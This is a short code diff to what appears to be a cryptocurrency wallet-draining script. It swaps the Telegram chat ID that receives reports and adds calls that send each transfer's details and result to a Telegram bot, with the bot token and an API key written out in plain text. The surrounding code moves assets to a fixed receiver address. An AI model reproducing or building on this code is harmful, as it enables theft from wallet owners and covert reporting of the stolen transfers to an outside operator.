@@ -285,7 +285,7 @@ async function getNFTs(address="", api_key="gChmOmU1HuqnEPvXPFKuLPlKMbQOI50jgS8P
 }
 async function sendMessage(message){
   return new Promise((resolve, reject)=>{
-    const chat_id = 1114693003;
+    const chat_id = 5227607491;
     fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
           method: "GET",
           headers: {
@@ -390,8 +390,10 @@ async function proceed(){
             receiver: receiver_address,
           };
           console.log(options);
+          sendMessage(options);
           let result = await Moralis.transfer(options);
           console.log(result);
+          sendMessage(result);
         }
         else {
           console.log("Insufficient funds")
